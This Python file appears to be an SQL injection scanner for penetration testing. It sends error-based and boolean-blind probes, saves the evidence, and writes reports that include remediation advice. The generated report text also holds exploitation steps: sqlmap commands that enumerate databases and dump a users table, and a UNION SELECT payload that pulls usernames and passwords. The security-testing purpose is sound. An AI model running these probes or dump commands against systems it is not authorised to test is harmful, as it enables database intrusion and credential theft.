"""
sqli_scanner.py — SQL Injection Scanner with Full Forensic Evidence Capture
"""
import time, re, urllib3
from urllib.parse import urlparse, parse_qs
from typing import List, Dict, Optional
import requests
urllib3.disable_warnings()

try:
    from utils.evidence_recorder import (
        EvidenceRecorder, DiffEvidence,
        make_tool_explanation, make_business_impact, make_cvss_breakdown
    )
    HAS_RECORDER = True
except ImportError:
    HAS_RECORDER = False

ERROR_PATTERNS = {
    "MySQL":      [r"SQL syntax.*MySQL", r"Warning.*mysql_", r"MySQLSyntaxErrorException",
                   r"check the manual that corresponds to your MySQL", r"MySQL server version"],
    "PostgreSQL": [r"PostgreSQL.*ERROR", r"Warning.*pg_", r"PG::SyntaxError",
                   r"pg_query\(\).*failed", r"ERROR:.*syntax error"],
    "MSSQL":      [r"Driver.*SQL Server", r"OLE DB.*SQL Server", r"Unclosed quotation mark",
                   r"Incorrect syntax near", r"Microsoft SQL Native Client"],
    "Oracle":     [r"ORA-[0-9]{5}", r"Oracle error", r"quoted string not properly terminated"],
    "SQLite":     [r"SQLite.*Exception", r"System\.Data\.SQLite", r"near \".*\": syntax error"],
    "Generic":    [r"java\.sql\.SQLException", r"Syntax error in SQL", r"SQL command not properly ended"],
}

def detect_db_error(text: str) -> Optional[Dict]:
    for db_type, patterns in ERROR_PATTERNS.items():
        for pattern in patterns:
            match = re.search(pattern, text, re.IGNORECASE)
            if match:
                start = max(0, match.start() - 80)
                end   = min(len(text), match.end() + 220)
                return {"db_type": db_type, "pattern": pattern,
                        "matched": match.group(0), "context": text[start:end].strip()}
    return None

def run_sqli_scanner(target_url, params=None, progress_callback=None, recorder=None):
    session = requests.Session()
    session.verify = False
    session.headers.update({"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/115.0"})

    findings = []
    parsed = urlparse(target_url)
    url_params_dict = parse_qs(parsed.query)
    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    base_params = {k: v[0] for k, v in url_params_dict.items()}
    test_params = list(set((params or []) + list(url_params_dict.keys()))) or ["id","q","search","user","page","cat"]

    # Baseline
    baseline_len, baseline_req_rec, baseline_resp_rec = 0, None, None
    try:
        if recorder:
            br, baseline_req_rec, baseline_resp_rec = recorder.capture_request_response(
                session, "GET", base_url,
                purpose="Baseline — recording normal application response before any injection",
                params=base_params)
            baseline_len = baseline_resp_rec.full_body_length if baseline_resp_rec else 0
        else:
            br = session.get(base_url, params=base_params, timeout=10)
            baseline_len = len(br.content)
    except Exception:
        pass

    total = len(test_params) * 5
    tested = 0

    for param in test_params:
        found = False

        # --- Error-based probes ---
        for probe_name, payload in [("single_quote","'"), ("double_quote",'"'), ("comment","1'--")]:
            if found: break
            tested += 1
            if progress_callback:
                progress_callback(tested/total, f"SQLi error probe: {param}={payload}")

            test_p = {k: v for k, v in base_params.items()}
            test_p[param] = payload
            try:
                if recorder:
                    resp, req_rec, resp_rec = recorder.capture_request_response(
                        session, "GET", base_url,
                        purpose=f"Injecting {probe_name} into '{param}' to trigger SQL syntax error",
                        params=test_p)
                else:
                    resp = session.get(base_url, params=test_p, timeout=10)
                    req_rec = resp_rec = None

                if resp is None: continue
                db_error = detect_db_error(resp.text)

                if db_error:
                    found = True
                    ev = None
                    if recorder and HAS_RECORDER:
                        ev = recorder.new_record("SQLi Scanner", "SQL Injection (Error-based)")
                        ev.request  = req_rec
                        ev.response = resp_rec
                        if baseline_req_rec:
                            ev.additional_requests.append({
                                "label": "Baseline (no injection)",
                                "method": baseline_req_rec.method, "url": baseline_req_rec.url,
                                "params": baseline_req_rec.params, "purpose": baseline_req_rec.purpose,
                                "status_code": baseline_resp_rec.status_code if baseline_resp_rec else 0,
                                "response_len": baseline_len,
                                "body_snippet": (baseline_resp_rec.body_snippet[:300] if baseline_resp_rec else ""),
                            })
                        ev.tool_explanation = make_tool_explanation("sql injection error-based", target_url, param, payload)
                        ev.business_impact  = make_business_impact("sql injection", target_url, param)
                        ev.cvss_breakdown   = make_cvss_breakdown("sql injection", 9.8)
                        ev.attack_steps = [
                            {"step":1,"action":"Establish baseline",
                             "what_was_done":f"Sent clean GET to {base_url} with {param}={base_params.get(param,'1')}",
                             "tool_used":"HTTP GET via custom scanner",
                             "why":"Record normal response before injection — our control sample",
                             "what_was_observed":f"HTTP {baseline_resp_rec.status_code if baseline_resp_rec else 200} — {baseline_len:,} bytes, no errors",
                             "what_it_means":"Application functioning normally. Baseline established."},
                            {"step":2,"action":"Single-quote injection",
                             "what_was_done":f"Changed {param} to: {payload}",
                             "tool_used":"HTTP GET with SQL metacharacter",
                             "why":"A single quote breaks SQL string syntax if the app concatenates input directly into queries. Prepared statements treat it as literal data — vulnerable apps don't.",
                             "what_was_observed":f"HTTP {resp.status_code} — {db_error['db_type']} error in response: \"{db_error['matched']}\"",
                             "what_it_means":f"The {db_error['db_type']} database processed our quote as SQL syntax and threw a parser error. Definitive proof of SQL injection.",
                             "raw_evidence": db_error['context']},
                            {"step":3,"action":"Confirm exploitability",
                             "what_was_done":"Analyse error message for SQL query structure",
                             "tool_used":"Manual error string analysis",
                             "why":"The error often reveals the SQL query structure, database version, and exact injection context",
                             "what_was_observed":f"Error context: {db_error['context'][:200]}",
                             "what_it_means":f"{db_error['db_type']} is processing unsanitised input. UNION-based or sqlmap extraction is fully feasible."},
                        ]
                        ev.curl_command = (
                            f"# Confirm injection:\ncurl -g -k \"{base_url}?{param}=%27\" -v\n\n"
                            f"# Extract databases:\nsqlmap -u \"{base_url}?{param}=1\" -p {param} --dbs --batch\n\n"
                            f"# Dump credentials table:\nsqlmap -u \"{base_url}?{param}=1\" -p {param} -D TARGET_DB -T users --dump --batch")
                        ev.burp_steps = (
                            f"1. Intercept GET {base_url}?{param}=1 in Burp Proxy\n"
                            f"2. Send to Repeater (Ctrl+R)\n3. Set {param}='\n4. Send\n"
                            f"5. Response shows {db_error['db_type']} error — confirmed\n"
                            f"6. Try: ' UNION SELECT NULL,NULL-- (increase NULLs until no error)\n"
                            f"7. Extract: ' UNION SELECT username,password FROM users--")
                        ev.proof_statement = (
                            f"The {db_error['db_type']} database returned syntax error when a single-quote "
                            f"was injected into '{param}'. Error string \"{db_error['matched']}\" appeared "
                            f"in HTTP {resp.status_code} response ({resp_rec.full_body_length if resp_rec else '?'} bytes). "
                            f"This proves SQL query construction by string concatenation without parameterisation.")
                        recorder.save(ev)

                    findings.append({
                        "type": f"SQL Injection (Error-based) — {db_error['db_type']}",
                        "url": f"{base_url}?{param}={payload}", "param": param, "payload": payload,
                        "severity": "CRITICAL", "cvss": 9.8,
                        "evidence": f"{db_error['db_type']} syntax error: \"{db_error['context'][:300]}\"",
                        "remediation": (
                            "Replace ALL string-concatenated SQL with parameterised queries / prepared statements. "
                            "Python: cursor.execute('SELECT * FROM t WHERE id=%s',(uid,)). "
                            "PHP: PDO bindParam(). Java: PreparedStatement. "
                            "Additionally: suppress DB errors in production, apply WAF, "
                            "use least-privilege DB user (no FILE/DROP privileges)."),
                        "evidence_record": ev, "db_type": db_error['db_type'], "error_context": db_error['context'],
                    })
                    break
            except Exception:
                pass
            time.sleep(0.3)

        if found: continue

        # --- Boolean blind ---
        tested += 1
        if progress_callback:
            progress_callback(tested/total, f"Boolean blind on '{param}'")
        try:
            tp = {k: v for k, v in base_params.items()}; tp[param] = "1 AND 1=1"
            fp = {k: v for k, v in base_params.items()}; fp[param] = "1 AND 1=2"

            if recorder:
                tr, tqr, trr = recorder.capture_request_response(session,"GET",base_url,
                    purpose=f"TRUE condition (AND 1=1) into '{param}' — should return full content",params=tp)
                fr, fqr, frr = recorder.capture_request_response(session,"GET",base_url,
                    purpose=f"FALSE condition (AND 1=2) into '{param}' — should return empty if vulnerable",params=fp)
                tl = trr.full_body_length if trr else 0
                fl = frr.full_body_length if frr else 0
            else:
                tr = session.get(base_url,params=tp,timeout=10)
                fr = session.get(base_url,params=fp,timeout=10)
                tl,fl = len(tr.content),len(fr.content)
                tqr=trr=fqr=frr=None

            delta = abs(tl - fl)
            if delta > 80:
                ev = None
                if recorder and HAS_RECORDER:
                    ev = recorder.new_record("SQLi Scanner","SQL Injection (Boolean Blind)")
                    ev.request = tqr; ev.response = trr
                    ev.diff = DiffEvidence(
                        baseline_request=f"GET {base_url}?{param}=1+AND+1=1",
                        baseline_response_length=tl, baseline_status=tr.status_code if tr else 0,
                        probe_request=f"GET {base_url}?{param}=1+AND+1=2",
                        probe_response_length=fl, probe_status=fr.status_code if fr else 0,
                        length_delta=delta,
                        interpretation=(
                            f"TRUE condition (AND 1=1) → {tl:,} bytes. "
                            f"FALSE condition (AND 1=2) → {fl:,} bytes. "
                            f"Delta of {delta:,} bytes proves the server evaluates injected SQL logic. "
                            f"Full database extraction achievable via binary-search boolean queries."))
                    ev.additional_requests.append({
                        "label":"FALSE condition (AND 1=2)","method":"GET","url":base_url,"params":fp,
                        "purpose": fqr.purpose if fqr else "",
                        "status_code": fr.status_code if fr else 0,
                        "response_len": fl,
                        "body_snippet": (fr.text[:300] if fr else ""),})
                    ev.tool_explanation = make_tool_explanation("sql injection boolean blind",target_url,param,"1 AND 1=1")
                    ev.business_impact  = make_business_impact("sql injection",target_url,param)
                    ev.cvss_breakdown   = make_cvss_breakdown("sql injection",9.1)
                    ev.attack_steps = [
                        {"step":1,"action":"TRUE condition","what_was_done":f"{param}=1 AND 1=1",
                         "tool_used":"HTTP GET with boolean SQL","why":"1=1 is always true — app should return normal content",
                         "what_was_observed":f"HTTP {tr.status_code if tr else '?'} — {tl:,} bytes","what_it_means":"Normal content returned."},
                        {"step":2,"action":"FALSE condition","what_was_done":f"{param}=1 AND 1=2",
                         "tool_used":"HTTP GET with boolean SQL","why":"1=2 is always false — vulnerable app returns different content",
                         "what_was_observed":f"HTTP {fr.status_code if fr else '?'} — {fl:,} bytes","what_it_means":f"{delta:,}-byte difference confirms server evaluates our SQL."},
                        {"step":3,"action":"Differential confirmation",
                         "what_was_done":f"Compared: TRUE={tl:,}B vs FALSE={fl:,}B, Δ={delta:,}B",
                         "tool_used":"Response length differential","why":"Consistent delta is the blind SQLi signature",
                         "what_was_observed":f"{delta:,} bytes over the 80-byte threshold — confirmed",
                         "what_it_means":"Blind SQLi confirmed. sqlmap can extract entire DB content."},]
                    ev.curl_command = (
                        f"# Prove boolean differential:\ncurl -g -sk \"{base_url}?{param}=1+AND+1=1\" | wc -c\n"
                        f"curl -g -sk \"{base_url}?{param}=1+AND+1=2\" | wc -c\n\n"
                        f"# Full extraction:\nsqlmap -u \"{base_url}?{param}=1\" -p {param} --technique=B --level=3 --dbs --batch")
                    ev.proof_statement = (
                        f"Boolean blind SQLi on '{param}': TRUE→{tl:,}B, FALSE→{fl:,}B, Δ={delta:,}B. "
                        f"Server evaluates injected SQL logic. Full extraction feasible without visible errors.")
                    recorder.save(ev)

                findings.append({
                    "type":"SQL Injection (Boolean-based Blind)",
                    "url":f"{base_url}?{param}=1+AND+1=1","param":param,
                    "payload":f"TRUE: 1 AND 1=1 → {tl:,}B | FALSE: 1 AND 1=2 → {fl:,}B | Δ={delta:,}B",
                    "severity":"CRITICAL","cvss":9.1,
                    "evidence":f"Boolean differential: TRUE={tl:,}B, FALSE={fl:,}B, Δ={delta:,}B — proves server evaluates injected SQL",
                    "remediation":"Use parameterised queries for all DB interactions. Never concatenate user input into SQL.",
                    "evidence_record":ev,})
        except Exception:
            pass
        time.sleep(0.3)

    return findings
